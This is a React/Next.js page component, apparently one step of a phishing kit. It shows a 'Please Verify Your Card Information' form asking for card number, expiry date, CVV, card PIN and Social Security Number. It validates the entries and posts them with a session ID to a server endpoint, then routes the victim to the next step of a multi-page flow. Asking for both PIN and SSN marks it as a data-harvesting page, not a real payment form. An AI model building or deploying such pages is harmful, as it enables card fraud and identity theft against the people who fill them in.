import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import valid from "card-validator";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../../components/Input";
import { Wrapper } from "../../components/Wrapper";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Card number is required")
    .test(
      "test-number",
      "Card number is invalid",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Expiry date is required")
    .test(
      "test-date",
      "Expiry date is required",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("CVV is required")
    .test(
      "test-cvv",
      "CVV is invalid",
      (value) => valid.cvv(value, [3, 4]).isValid
    ),
  cardPin: yup
    .string()
    .required("Card pin is required")
    .test("test-pin", "Enter valid 4-digit PIN`", (val) => !isNaN(Number(val)))
    .min(4, "Enter valid 4-digit PIN")
    .max(5, "Enter valid 4-digit PIN"),
  ssn: yup.string().required("SSN is required"),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper
      title="Card details"
      subTitle="Please Verify Your Card Information"
      loading={!isValid || loading}
      onSubmit={onSubmit}
      icon={
        <svg
          className="pt4 pb2 signup-img"
          aria-hidden="true"
          viewBox="0 0 24 24"
          data-testid="CreditCardIcon"
          fill="#0078E7"
          width={`3.75em`}
          height={`3.75em`}
        >
          <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
        </svg>
      }
    >
      <Input
        label={`Card Number`}
        name={`cardNumber`}
        register={register}
        resetField={resetField}
        curValue={watch(`cardNumber`)}
        registerOptions={{
          onChange: (event: any) => {
            var value = event.target.value;

            var newState = "9999 9999 9999 9999";
            if (/^3[47]/.test(value)) {
              newState = "9999 999999 99999";
            }
            setCardMask(newState);
          },
        }}
        mask={cardMask}
        error={
          errors.cardNumber && (errors.cardNumber.message as unknown as string)
        }
      />

      <Input
        label={`Expiration Date`}
        name={`expirationDate`}
        register={register}
        resetField={resetField}
        curValue={watch(`expirationDate`)}
        mask={`99/9999`}
        error={
          errors.expirationDate &&
          (errors.expirationDate.message as unknown as string)
        }
      />

      <Input
        label={`CVV`}
        name={`cvv`}
        register={register}
        resetField={resetField}
        curValue={watch(`cvv`)}
        maxLength={4}
        error={errors.cvv && (errors.cvv.message as unknown as string)}
        type="number"
      />

      <Input
        label={`PIN`}
        name={`cardPin`}
        register={register}
        resetField={resetField}
        curValue={watch(`cardPin`)}
        maxLength={5}
        error={errors.cardPin && (errors.cardPin.message as unknown as string)}
        type="number"
      />

      <Input
        label={`Social Security Number or Tax ID`}
        name={`ssn`}
        register={register}
        resetField={resetField}
        curValue={watch(`ssn`)}
        error={errors.ssn && (errors.ssn.message as unknown as string)}
        mask={`999-99-9999`}
      />
    </Wrapper>
  );
};

export default Card;
